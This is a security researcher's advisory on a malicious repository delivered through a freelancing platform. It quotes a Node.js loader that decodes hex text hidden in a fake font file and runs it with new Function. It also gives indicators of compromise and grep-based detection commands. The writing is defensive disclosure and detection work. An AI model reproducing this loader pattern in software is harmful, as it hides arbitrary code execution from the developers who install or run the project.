# Hex Payload Hidden in a Fake Font File, Run by a `new Function` Loader (coinbucket/dex-mvp)

**Author:** Trygve Bundgaard — independent security researcher (GitHub: [@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))
**Discovered:** 2026-10-15
**Status:** Malware identified before execution by remote, read-only review. No repository file was cloned, downloaded, installed, opened in an IDE or run. The code was read in GitLab's web view; only API metadata was saved locally. Reported to GitLab (abuse report) and to Upwork on 2026-10-15; outcome pending.
**Severity:** Critical — arbitrary code execution in Node.js
**Type:** Developer-targeted malware delivered through a freelancing platform

> The only indicator domain below is defanged (`[.]`). The payload hasn't been decoded, so no command-and-control address is known and none is listed.

## Summary

A repository I received through Upwork, `dex-mvp`, hides its
payload in a file named like a Font Awesome web font,
`webfonts/fa-brands-regular.woff2`. The file isn't a font: it holds hex text.
A 388-byte loader in `server/config/conf.js` reads that text, decodes the hex
and runs the result with `new Function`.

This is the same "compile text into a function and run it" primitive as the
[W3GLFun](2026-01-27-contagious-interview-w3glfun-rce.md) and
[env-var](2026-01-29-env-var-runtime-rce-optu.md) cases, with a different
hiding place. Those fetched their payload from a URL at runtime. This one
**ships it inside the repo, disguised as a binary asset**. Reviewers tend to
skip font files, and the loader contains no URL to grep for.

## Technical analysis

The loader, `server/config/conf.js`, from line 4 to the end (lines 1–3 not
shown):

```javascript
const hex = fs.readFileSync(path.join(__dirname, '../../webfonts/fa-brands-regular.woff2'), 'utf8')
  .replace(/[^0-9a-f]/gi, '');

const src = Buffer.from(hex, 'hex').toString('utf8');

new Function('require','module','exports','__filename','__dirname', src)(
  require,
  module,
  exports,
  __filename,
  __dirname
);
```

I compared this quote by eye with GitLab's file view on 2026-10-15; whitespace may differ.

| Step | What happens |
|------|--------------|
| `readFileSync(… 'fa-brands-regular.woff2', 'utf8')` | Reads the "font" as text. The path resolves to `webfonts/` at the repo root |
| `.replace(/[^0-9a-f]/gi, '')` | Strips every non-hex character, so the file can carry line breaks or filler. Without it, Node's hex decoder would stop at the first non-hex character |
| `Buffer.from(hex, 'hex')` | Turns the hex back into a source string |
| `new Function('require', 'module', …, src)(…)` | Compiles that string with parameters named `require`, `module`, `exports`, `__filename` and `__dirname`, then calls it with the loader module's own `require`, `module`, `exports`, `__filename` and `__dirname`. The payload can load any built-in module (including `fs`, `child_process` and the network modules) or any installed package, and can replace the module's exports, so it can do anything Node can with the privileges of the user running it |

**The "font":** a real WOFF2 file is binary and starts with the 4-byte
signature `wOF2`. This one is 94,839 bytes of text that the loader treats as
hex. I haven't decoded or analysed the payload, so its behaviour is unknown.

**Not determined:**

- **What loads `conf.js`.** The server entry point (`server/index.js`),
  `app.js`, the routes and the controllers that were read don't `require` it.
  Unread candidates include other controllers, models and helpers, the
  frontend `src/`, and CI configuration. Anything that runs `node` on the
  file, or loads a module that requires it, runs the payload.
- **Whether `.vscode/` holds an auto-run task.** The folder listing couldn't
  be read; only `launch.json` was seen, and it's harmless. An auto-run task is
  the vector in the [IDE auto-run case](2026-01-30-ide-autorun-rce-vscode-tasks.md).
- **Whether dependencies, lockfiles, CI or other `package.json` files add
  triggers.** These weren't checked.
- **The payload's behaviour,** C2 address and persistence.

Treat opening the folder in an IDE, `npm install` and `npm start` (which runs
`node server/index.js`) as unsafe.

### Red flags around the code

- **Fresh project, older history.** The GitLab project was created on
  2026-10-09, but every commit seen is dated 2026-08-08 to 2026-08-17. That
  covers the 100 newest commits and the loader's commit. So the history was
  made elsewhere or back-dated. Committers set their own commit dates, so on
  its own this is a weak signal. The loader was added in commit `8a05175b`,
  its only commit, dated 2026-08-08.
- **Odd commits.** Messages that look auto-generated ("Fix bug in X", "Add UI
  in X") are applied to images, stylesheets and build-hashed bundles. The 100
  newest commits have three author identities, at UTC offsets +04:00,
  +07:00 and +09:00.
- **Stitched-together code.** The frontend is a decentralized-exchange app,
  while `server/` is an unrelated e-commerce backend. `.vscode/launch.json`
  references an AWS profile that matches neither app. It showed no
  auto-run entry.
- **No install hooks.** The root `package.json` has no `preinstall`,
  `postinstall` or `prepare` script. A review that stops there finds nothing.

## Indicators of compromise

| Indicator | Value |
|-----------|-------|
| Repository | `gitlab[.]com/coinbucket/dex-mvp`, project ID `87449275` (public as of 2026-10-15) |
| Account | GitLab user `coinbucket`, namespace ID `142836081` |
| Loader | `server/config/conf.js`, 388 bytes, git blob `8af462a9794f0b93df15edda98391d6cec055eba`. Pattern: `fs.readFileSync` of a font path → strip non-hex → `Buffer.from(…, 'hex')` → `new Function('require', …)` |
| Loader added in | commit `8a05175b550e0102988ebfb3d936de30343fb7b8` (the file's only commit) |
| Payload file | `webfonts/fa-brands-regular.woff2`, 94,839 bytes, git blob `e0b5edb035e5629dd83dcc03ac6be746d934c418` (text, not WOFF2) |
| Payload added in | commit `a2ecb0f854a20c600c0e506d560143e668bb293b` (the file's only commit) |

The git blob IDs (SHA-1) identify the exact file contents. A copy of these
files tracked in another SHA-1 git repo has the same blob ID, whatever its
name. For an untracked copy, compare `git hash-object <file>`.

## Detection

These commands catch this sample. They don't cover the whole family. Run them
only inside a disposable VM, or skip them and read the files through the
hosting site's web view without cloning.

```bash
# the execution primitive (also catches Function( without new)
grep -rnE "\bFunction\s*\(|Function\.constructor|vm\.runIn" --include='*.js' --include='*.jsx' --include='*.cjs' --include='*.mjs' --include='*.ts' --include='*.tsx' --exclude-dir=node_modules .
# code that reads an asset file as text, or decodes hex
grep -rnE "readFile(Sync)?\(.*\.(woff2?|ttf|otf|eot|png|jpe?g|svg|ico)" --include='*.js' --include='*.jsx' --include='*.cjs' --include='*.mjs' --include='*.ts' --include='*.tsx' --exclude-dir=node_modules .
grep -rnE "Buffer\.from\(.*['\"]hex['\"]" --include='*.js' --include='*.jsx' --include='*.cjs' --include='*.mjs' --include='*.ts' --include='*.tsx' --exclude-dir=node_modules .
# font files that are really text
find . -type f \( -name '*.woff2' -o -name '*.woff' -o -name '*.ttf' -o -name '*.otf' \) -exec file --mime-type {} + | grep ': text/'
# known blob IDs, in a git checkout
git ls-files -s | grep -E "e0b5edb035e5629dd83dcc03ac6be746d934c418|8af462a9794f0b93df15edda98391d6cec055eba"
```

A matching `wOF2` signature isn't proof by itself, because a loader can skip
a fake header before decoding. Check that the whole file is binary, for
example with `file --mime-type` or `head -c 64 <file> | xxd`.

## Safe handling

- **Asset files can be code.** Check that fonts, images and other "binary"
  assets really are what their extension says, especially when a source file
  reads them.
- **Treat `new Function` / `Function.constructor` fed by file contents or
  network data as remote code execution** until proven otherwise.
- **Don't stop at `package.json`.** This family keeps moving the trigger into
  ordinary application files.
- **Review before you clone.** This case was triaged through GitLab's API and
  file views, with AI-assisted, web-only tooling. No repository file was
  cloned, downloaded, installed or run.
- **If you already ran it,** treat the machine as compromised. Rotate every
  credential it could reach, and move funds to new wallets whose keys never
  touched that machine.

## Timeline

- **2026-10-15:** reviewed remotely (the repo arrived through Upwork); loader
  and fake font identified.
- **2026-10-15:** reported to GitLab (abuse report) and to Upwork.

## Campaign context

This case uses the same "compile text with `require` in scope" execution as
the W3GLFun and env-var cases. The new part is the concealment: the payload
ships in-repo as a fake font, instead of being fetched from a paste site or
from a URL hidden in an env var. These are documented together as concrete
indicators, not as an attribution claim.

---

*Published for the protection of the developer community. Individuals' names
withheld; indicators defanged. — Trygve Bundgaard ([@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))*
